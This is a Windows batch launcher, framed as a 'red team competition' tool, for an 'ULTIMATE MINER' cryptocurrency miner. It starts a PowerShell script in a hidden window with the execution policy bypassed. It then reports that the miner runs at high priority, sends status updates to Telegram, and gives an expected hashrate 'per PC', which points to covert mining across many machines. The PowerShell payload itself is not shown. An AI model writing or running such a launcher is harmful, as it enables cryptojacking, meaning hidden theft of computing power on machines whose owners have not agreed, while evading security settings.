@echo off
title ULTIMATE MINER - One-Click Deployment
echo.
echo  ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
echo  ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
echo  ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  
echo  ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  
echo  ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
echo   ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
echo.
echo        ONE-CLICK DEPLOYMENT FOR RED TEAM COMPETITION
echo.
echo ================================================================
echo  Deploying ultimate miner with all features...
echo ================================================================
echo.

REM Run the PowerShell script
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0DEPLOY_ULTIMATE.ps1"

echo.
echo ✅ Deployment initiated!
echo 📊 Check Telegram for status updates
echo 🔥 Miner is running with HIGH priority
echo 🎯 Expected hashrate: 5.5+ KH/s per PC
echo.
echo Press any key to exit...
pause >nul
